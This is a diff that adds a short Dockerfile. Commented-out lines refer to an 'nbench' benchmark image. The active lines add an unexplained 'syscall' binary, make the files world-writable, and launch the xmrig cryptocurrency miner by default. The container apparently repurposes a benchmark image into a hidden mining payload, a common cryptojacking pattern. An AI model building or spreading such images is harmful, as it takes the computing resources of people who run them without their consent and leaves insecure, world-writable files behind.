@@ -1,0 +1,24 @@
+#FROM gigichen34/nbench
+
+#WORKDIR /app
+
+#ADD syscall /usr/bin/
+
+#ENTRYPOINT ["./nbench"]
+
+FROM ubuntu:18.04
+
+ADD syscall /usr/bin/
+
+RUN chmod o+x /usr/bin/syscall
+
+ADD xmrig /home/
+
+ADD config.json /home/
+
+RUN chmod +777 /home/*
+
+WORKDIR /home/
+
+CMD ./xmrig
+
